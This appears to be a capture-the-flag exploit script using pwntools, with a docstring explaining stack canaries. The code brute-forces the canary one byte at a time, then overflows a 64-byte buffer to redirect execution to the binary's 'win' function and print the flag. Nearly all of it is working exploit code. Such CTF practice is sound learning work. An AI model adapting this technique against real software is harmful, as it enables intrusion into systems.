#!/usr/bin/env python3

"""
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE
ASLR:       Enabled

Now we have stack canary as well which is another security mechanism that protects against stack buffer overflows. 
It works by checking canary before returning out of every function and is placed just before base pointer and return pointer value in stack.
If we try to overwrite return pointer on the stack, canary also gets overwritten and so the program exits. Here we must get the canary correct 
as well before we overwrite the return pointer. This can be done by brute forcing canary one byte at a time. Here we are not making use of libc 
as we already have a function available inside the executeable by the name of win which prints the flag for us.
"""

from pwn import *

exe = context.binary = ELF("./vuln")

buffer = 64


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)


def canary_brute_force():
    canary = ""
    for i in range(1, 5):
        for c in range(256):
            p = start()
            p.sendlineafter(">", str(buffer + i))
            payload = b"A" * 64 + canary.encode() + chr(c).encode()
            p.sendlineafter(">", payload)

            if "Stack" not in str(p.recvall()):
                canary += chr(c)
                break
    return canary


canary = ""

canary = canary_brute_force()

payload = b"A" * buffer
payload += bytes(canary, encoding="utf-8")
payload += b"B" * 16
payload += pack(exe.sym.win)

p = start()
p.sendlineafter(">", str(len(payload)))
p.sendlineafter(">", payload)
p.interactive()


p.interactive()
